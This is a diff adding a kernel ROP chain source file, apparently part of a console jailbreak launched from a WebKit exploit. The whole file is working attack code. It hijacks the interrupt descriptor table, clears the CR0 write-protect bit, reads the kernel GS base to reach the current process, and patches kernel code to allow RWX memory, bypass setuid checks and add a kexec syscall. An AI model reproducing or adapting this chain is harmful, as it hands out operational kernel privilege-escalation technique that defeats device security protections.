@@ -1,0 +1,288 @@
+enter_krop:
+pop rax
+dp krop_preserve_rdi
+mov [rax], rdi
+pop rdi
+dp entry1 - 0x38
+$webkit_base + 0x36f8ef # int 0xc3
+krop_exit:
+pop rdi
+krop_preserve_rdi:
+dq 0
+mov rax, [rdi]
+pop rsi
+dp krop_ret
+mov [rsi], rax
+pop rsi
+dq -8
+sub rdi, rsi ; mov rdx, rdi
+pop rsp
+krop_ret:
+dq 0
+
+entry1:
+dp krop
+
+krop:
+_krop_idt_base:
+dq 0
+
+# save idt pointer for krop2
+pop rax
+dp krop2
+mov [rax], rdi
+
+# replace ud2 vector with pivot
+# rdi points to idt base, new contents prepared by c code
+
+pop rsi
+dq 0-0x60
+sub rdi, rsi ; mov rdx, rdi
+
+mov rax, [rdi]
+
+pop rsi
+dp udbak1
+mov [rsi], rax
+
+pop rax
+_krop_ud1:
+dq 0
+mov [rdi], rax
+
+pop rsi
+dq 0x60-0x68
+sub rdi, rsi ; mov rdx, rdi
+
+mov rax, [rdi]
+
+pop rsi
+dp udbak2
+mov [rsi], rax
+
+pop rax
+_krop_ud2:
+dq 0
+mov [rdi], rax
+
+pop rdi
+dp entry2-0x38
+
+# clear wp in cr0
+# warps to krop2 via ud2
+# gadget addresses filled by userspace
+
+_krop_read_cr0:
+dq 0
+pop rcx
+dq ~65536
+and rax, rcx
+_krop_write_cr0:
+dq 0
+# unreachable
+
+entry2:
+dp krop2
+
+krop2:
+dq 0
+
+# fix the idt
+# rdi points to idt base
+
+pop rsi
+dq 0-0x60
+sub rdi, rsi ; mov rdx, rdi
+pop rax
+udbak1:
+dq 0
+mov [rdi], rax
+
+pop rsi
+dq 0x60-0x68
+sub rdi, rsi ; mov rdx, rdi
+pop rax
+udbak2:
+dq 0
+mov [rdi], rax
+
+pop rsi
+dq 0x68-0xc30
+sub rdi, rsi ; mov rdx, rdi
+pop rax
+_krop_c3bak1:
+dq 0
+mov [rdi], rax
+
+pop rsi
+dq 0xc30-0xc38
+sub rdi, rsi ; mov rdx, rdi
+pop rax
+_krop_c3bak2:
+dq 0
+mov [rdi], rax
+
+pop rdi
+_krop_kernel_base:
+dq 0
+pop rax
+dp kbase1
+mov [rax], rdi
+
+# install a custom gadget
+pop rax
+dq 0xc3320f # xor rax, rax ; mov rax, [gs:rax] ; ret
+mov [rdi], eax
+pop rax
+dp rdmsr
+mov [rax], rdi
+
+pop rcx
+dq 0xc0000102 # IA32_KERNEL_GS_BASE
+rdmsr:
+dq 0
+
+# assemble reg from edx:eax
+pop rdi
+dp gsbase
+mov [rdi], eax
+mov eax, edx
+pop rdi
+dp gsbase+4
+mov [rdi], eax
+pop rax
+gsbase:
+dq 0
+
+# ->curthread
+mov rax, [rax]
+
+# ->td_proc
+pop rcx
+dq 8
+mov rax, [rcx + rax]
+
+# ->p_fd
+pop rcx
+dq 0x48
+mov rax, [rcx + rax]
+
+# ->fd_ofiles
+mov rax, [rax]
+
+# remove master_sock
+pop rcx
+_krop_master_sock:
+dq 0
+add rax, rcx
+pop rsi
+dq 0
+mov [rax], rsi
+
+# fix elf header
+pop rdi
+kbase1:
+dq 0
+pop rax
+db b'\x7fELF\0\0\0\0'
+mov [rdi], eax
+
+# some kernel patches?
+
+# syscall everywhere
+pop rsi
+dq 0-0x490
+sub rdi, rsi ; mov rdx, rdi
+xor eax, eax
+mov [rdi], eax
+
+pop rsi
+dq 0x490-0x4b2
+sub rdi, rsi ; mov rdx, rdi
+pop rax
+dq 0x19de9
+mov [rdi], rax
+
+# mmap rwx (from mira)
+pop rax
+dq 0x37
+
+pop rsi
+dq 0x4b2-0xab57a
+sub rdi, rsi ; mov rdx, rdi
+mov [rdi], al
+
+pop rsi
+dq 0xab57a-0xab57d
+sub rdi, rsi ; mov rdx, rdi
+mov [rdi], al
+
+# mprotect rwx (from mira)
+pop rsi
+dq 0xab57d-0x451db8
+sub rdi, rsi ; mov rdx, rdi
+pop rax
+dq 0x04eb
+mov [rdi], ax
+
+# setuid (from mira)
+pop rsi
+dq 0x451db8-0x10bed0
+sub rdi, rsi ; mov rdx, rdi
+pop rax
+dq 0x01ebc031 # xor eax, eax ; jmp start+5
+mov [rdi], eax
+
+# veri NOT fired
+pop rsi
+dq 0x10bed0-0x63c8ce
+sub rdi, rsi ; mov rdx, rdi
+pop rax
+dq 0x9090
+mov [rdi], ax
+
+# kexec (syscall #11)
+pop rsi
+dq 0x63c8ce-0x111e210
+sub rdi, rsi ; mov rdx, rdi
+pop rax
+dq 2
+mov [rdi], rax
+
+mov rax, rdi
+pop rcx
+dq 0x31c05c-0x111e210
+add rax, rcx
+pop rsi
+dq 0x111e210-0x111e218
+sub rdi, rsi ; mov rdx, rdi
+mov [rdi], rax
+
+pop rsi
+dq 0x111e218-0x111e238
+sub rdi, rsi ; mov rdx, rdi
+pop rax
+dq 0x100000000
+mov [rdi], rax
+
+# reset CR0.WP
+_krop_read_cr0_2:
+dq 0
+
+$webkit_base + 0x3cf3f4 # iretq
+nop # return to ret, so that rop continues to run
+dq 0x43 # cs
+dq 514 # EFLAGS.IF
+dp krop_exit # rop chain continues
+dq 0x3b # ss
+
+#$webkit_base + 0x7cef8
+pop rcx
+dq 0
+pop r11 ; mov rax, rdi
+dq 514
+_krop_jmp_crash:
+dq 0
+
+_enter_krop:
+dp enter_krop
